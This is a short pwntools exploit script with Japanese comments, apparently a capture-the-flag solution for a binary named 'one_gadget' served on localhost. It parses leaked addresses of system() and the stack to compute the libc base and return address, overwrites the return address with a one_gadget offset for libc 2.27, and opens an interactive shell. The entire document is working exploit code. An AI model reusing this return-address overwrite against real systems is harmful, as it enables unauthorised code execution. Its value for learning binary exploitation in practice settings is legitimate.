from pwn import *

elf = ELF('./one_gadget')
libc = ELF('./libc-2.27.so')

io = remote('localhost', 30003)
#io = process('./one_gadget')

# libcのbaseアドレスをゲット
io.recvuntil(b'is ')
system_addr = int(io.recvline()[:-1], 16)
libc_base = system_addr - libc.symbols['system']
print('libc_base is {}'.format(hex(libc_base)))

# stackのリターンアドレスをゲット
io.recvuntil(b'is ')
stack_addr = int(io.recvline()[:-1], 16)
return_addr = stack_addr + 0x18
print('return_addr is {}'.format(hex(return_addr)))

one_gadget_addr = libc_base + 0x4f302

io.recvline()
io.sendline(hex(return_addr).encode())
io.recvline()
io.sendline(hex(one_gadget_addr).encode())

io.interactive()
